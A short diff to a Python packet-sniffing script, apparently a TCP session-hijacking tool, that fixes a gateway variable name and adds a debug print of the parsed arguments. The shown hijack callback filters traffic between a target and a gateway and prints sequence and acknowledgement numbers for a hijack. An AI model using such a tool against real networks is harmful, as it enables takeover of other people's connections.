@@ -3,7 +3,7 @@ from argparse import ArgumentParser
 import socket
 
 def hijack(packet):
-  if packet[IP].src == args.target_ip and packet[IP].dst == args.gateway:
+  if packet[IP].src == args.target_ip and packet[IP].dst == args.gateway_ip:
     print("TCP Sequence: " + str(packet[TCP].seq) + " | Ack: " + str(packet[TCP].ack))
     print("Hijack Sequence: " + str(packet[TCP].ack) + " | Hijack Ack: " + str(packet[TCP].seq))
     
@@ -45,6 +45,8 @@ args = parser.parse_args()
     
 try:
   socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
+  
+  print(args)
   
   # Checks if argument is not empty  
   if args.target_ip is not None and args.gateway_ip is not None and args.port is not None: 
